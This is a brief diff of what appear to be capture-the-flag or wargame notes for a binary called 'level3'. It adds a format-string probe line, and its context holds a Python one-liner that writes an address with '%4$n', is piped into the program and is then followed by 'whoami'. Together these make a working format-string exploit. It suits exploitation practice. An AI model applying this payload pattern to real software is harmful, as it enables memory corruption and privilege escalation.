@@ -5,6 +5,8 @@
 (gdb) set $eax=64
 (gdb) step
 
+python2.7 -c 'print("BBBB" + " %p"*4)'  | ./level3 
+
 python2.7 -c 'print("\x8c\x98\x04\x08" + "a"*60 + "%4$n")' > /tmp/exploit.txt
 cat /tmp/exploit.txt /dev/stdin | ./level3
 whoami
